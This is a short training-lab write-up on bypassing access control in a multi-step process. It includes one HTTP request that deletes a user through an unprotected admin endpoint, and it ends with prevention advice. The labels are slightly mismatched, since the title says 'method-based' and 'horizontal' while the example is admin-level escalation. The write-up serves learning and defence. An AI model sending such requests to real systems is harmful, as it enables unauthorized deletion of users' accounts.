# Access Control - Method-Based Bypass

## Lab Link
https://portswigger.net/web-security/access-control/horizontal-privilege-escalation/lab-access-control-violations-in-multi-step-processes

## Vulnerability Type
Horizontal Access Control Violation

## Difficulty
Easy

## Theory
Some applications check permissions at certain steps but not others. Attackers can skip steps or use different HTTP methods to bypass authorization checks.

## Exploitation
**Vulnerable flow:**
GET /admin → checks auth → redirects to login
POST /admin/action → no check → executes

**Payload:**
```
POST /admin/delete-user?id=123 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

confirm=true
```

## Prevention
- Check authorization on EVERY step
- Validate user permissions in backend
- Use consistent auth across all HTTP methods

---

**Difficulty**: Easy
**Time**: 10 minutes
